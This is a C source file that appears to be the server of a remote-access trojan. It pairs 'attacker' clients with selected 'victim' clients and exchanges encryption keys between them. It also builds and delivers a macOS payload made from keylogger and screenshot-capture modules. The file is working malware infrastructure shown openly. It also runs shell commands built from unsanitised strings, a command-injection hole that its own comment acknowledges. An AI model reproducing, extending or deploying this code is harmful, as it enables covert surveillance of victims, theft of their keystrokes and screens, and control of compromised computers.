#include "connection.h"

int opt = true; 
int i;

void initialize_connection(){		
	//create a master socket
	if( (master_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0) {
		perror("socket failed");
		exit(EXIT_FAILURE);
	}
		
	//set master socket to allow multiple connections, this is just a good habit, it will work without this
	if( setsockopt(master_socket, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt)) < 0 ) {
		perror("setsockopt");
		exit(EXIT_FAILURE);
	}
		
	//type of socket created
	address.sin_family = AF_INET;
	address.sin_addr.s_addr = INADDR_ANY;
	address.sin_port = htons( PORT );
		
	//bind the socket
	if (bind(master_socket, (struct sockaddr *)&address, sizeof(address)) < 0) { 
		perror("bind failed"); 
		exit(EXIT_FAILURE); 
	} 
	printf("Listener on port %d \n", PORT); 
		
	//try to specify maximum of 3 pending connections for the master socket 
	if (listen(master_socket, 3) < 0) { 
		perror("listen"); 
		exit(EXIT_FAILURE); 
	}
	//accept the incoming connection, waiting for connections
	addrlen = sizeof(address);
		
}
void add_child_sockets_to_set(client_ptr * client_list){
	client_ptr curr_client = *client_list;
	while(curr_client){
		//socket descriptor 
		socket_descriptor = curr_client->socket_fd;
	
		//if valid socket descriptor then add to read list 
		if(socket_descriptor > 0)
			FD_SET(socket_descriptor , &readfds); 
			
		//highest file descriptor number, need it for the select function 
		if(socket_descriptor > max_socket_descriptor) 
			max_socket_descriptor = socket_descriptor; 
		
		curr_client = curr_client->next_client;
	}
}

// set the connection between the attacker and his selected victim by setting the socket file descriptor for hech to the other
void set_attacker_victim_connection (client_ptr * attacker, client_ptr * client_list, int num_of_connected_clients, char * selected_victim_name){
	action_type action = KEY_EXCHANGE;
	char attacker_hashed_id[HASH_LEN];
	strcpy(attacker_hashed_id, md5((*attacker)->id));
	client_ptr curr_client = * client_list;
	while (curr_client){
		if (strcmp(curr_client->id, attacker_hashed_id) == 0 && strcmp(curr_client->name, decrypt_text(selected_victim_name, (*attacker)->encryption_key)) == 0 && curr_client->i_am == VICTIM){
			
			// if this client is the selected victim of the attacker -> then we will set the fd and aed key accordingly
			curr_client->other_side_sfd = (*attacker)->socket_fd; // set the socket file descriptor of the attacket to the victim
			(*attacker)->other_side_sfd = curr_client->socket_fd;
			strcpy(curr_client->encryption_key, (*attacker)->encryption_key);
			
			send(curr_client->socket_fd, &action, sizeof(action_type), 0); // send a signal to the victim, in order thet the victim will send bake the rsa public key
		}
		curr_client = curr_client->next_client;
	}
}

void recv_attacker_aes_key(client_ptr * curr_client, const char * rsa_base64_to_decrypt){
	FILE * temp_rsa_file;
	FILE * rsa_decryption_fd;
	char temp_rsa_file_name[10];
	char decrypt_rsa_cmd[90];
	char remove_temp_rsa_file_cmd[15];
	
	sprintf(temp_rsa_file_name, "%d.txt", (*curr_client)->socket_fd);
	temp_rsa_file = fopen(temp_rsa_file_name, "w");
	fputs(rsa_base64_to_decrypt, temp_rsa_file);
	fclose(temp_rsa_file);
	
	sprintf(decrypt_rsa_cmd, "openssl base64 -d -in %s | openssl rsautl -decrypt -inkey private_key.pem", temp_rsa_file_name);
	
	rsa_decryption_fd = popen(decrypt_rsa_cmd, "r");
	fgets((*curr_client)->encryption_key, sizeof((*curr_client)->encryption_key), rsa_decryption_fd);
	
	pclose(rsa_decryption_fd);
	sprintf(decrypt_rsa_cmd, "rm %s", temp_rsa_file_name);
	system(decrypt_rsa_cmd);
}

void send_to_attacker_connected_victims (client_ptr attacker, client_ptr client_list, int num_of_connected_clients){
	int num_of_connected_victims = 0;
	char connected_victims[MAX_VICTIMS_PER_ATTACKER][MAX_USER_NAME_LEN];
	
	for (int i = 0;  i < MAX_VICTIMS_PER_ATTACKER; i++)
		memset(connected_victims[i], '\0', MAX_USER_NAME_LEN);
	
	while (client_list){
		if (strcmp(client_list->id, md5(attacker->id)) == 0 && client_list->i_am == VICTIM){
			strtok(client_list->name, "\n"); // if exist, remove the '\n'
			strcpy(connected_victims[num_of_connected_victims++], client_list->name);
		}
		client_list = client_list->next_client;
	}
	send(attacker->socket_fd, &connected_victims, sizeof(connected_victims), 0);
}

//AES 256 cbc decryption
char * decrypt_text (char * text_to_decrypt, char * decryption_key){
	char * decrypted_text = (char *) malloc(strlen(text_to_decrypt) * sizeof(char));
	char sub_buffer[65];
	char decrypt_commend[40 + strlen(text_to_decrypt) + strlen(decryption_key)];
	
	FILE * temp_aes_file = fopen(ENCRYPTED_RECEIVED_DATA_NAME, "w");
	fprintf(temp_aes_file, "%s", text_to_decrypt);
	fclose(temp_aes_file);
	sprintf(decrypt_commend, "openssl aes-256-cbc -d -in %s -base64 -k %s", ENCRYPTED_RECEIVED_DATA_NAME, decryption_key);
	
	FILE * aes_decryption_fd = popen(decrypt_commend, "r");
	while (fgets(sub_buffer, sizeof(sub_buffer), aes_decryption_fd) != NULL) 
		strcat(decrypted_text, sub_buffer);
		
	pclose(aes_decryption_fd);
	return decrypted_text;
}

// send a file in plain text or in AES-256-CBC encrypted way
void send_payload_to_attacker(int attacker_fd, char * aes_key){
	main_data data;
	char sub_buffer[MTU];
	FILE * payload_fd;
	char convert_file_to_buffer_commend[MAX_PAYLOAD_TO_BUFFER_COMMEND_LEN];
	char create_payload_command[300];
	char create_dir[15];
	char remove_dir[15];
	
	char temp_checksum_full_buffer[MTU + HASH_LEN];
	char temp_checksum[HASH_LEN];
	strcpy(temp_checksum, "\0");
	memset(temp_checksum_full_buffer, '0', strlen(temp_checksum_full_buffer));
	
	// generate the payload, for any attack we create temp folder that will hold his victim payload
	sprintf(create_dir, "mkdir -p %d", attacker_fd);
	system(create_dir);// creating temp folder to hole the payload 
	sprintf(create_payload_command, "gcc victim_payload/Victim_main.c victim_payload/screenshot_capture.c victim_payload/keylogger.c victim_payload/connection.c victim_payload/other_attacks.c victim_payload/md5.c -framework ApplicationServices -framework Carbon -o %d/payload", attacker_fd); // in the further this command will cross compil the payload
	system(create_payload_command);
	sprintf(convert_file_to_buffer_commend, "openssl aes-256-cbc -base64 -in %d/payload -k %s",attacker_fd, aes_key); // there is injection variability, to be fix

	payload_fd = popen(convert_file_to_buffer_commend, "r");
	
	data.file_data.end_of_file = 0;
	while (fgets(sub_buffer, sizeof(sub_buffer), payload_fd) != NULL) {
		strcpy(temp_checksum_full_buffer, temp_checksum);
		strcat(temp_checksum_full_buffer, sub_buffer);
		strcpy(temp_checksum, md5(temp_checksum_full_buffer));
		strcpy(data.file_data.file_sub_buffer, sub_buffer);
		send(attacker_fd, &data.file_data, sizeof(data.file_data), 0);
	}
	
	data.file_data.end_of_file = 1;
	strcpy(data.file_data.checksum, temp_checksum);
	send(attacker_fd, &data.file_data, sizeof(data.file_data), 0);
	
	sprintf(remove_dir, "rm -rf %d", attacker_fd);
	system(remove_dir);
	pclose(payload_fd);
}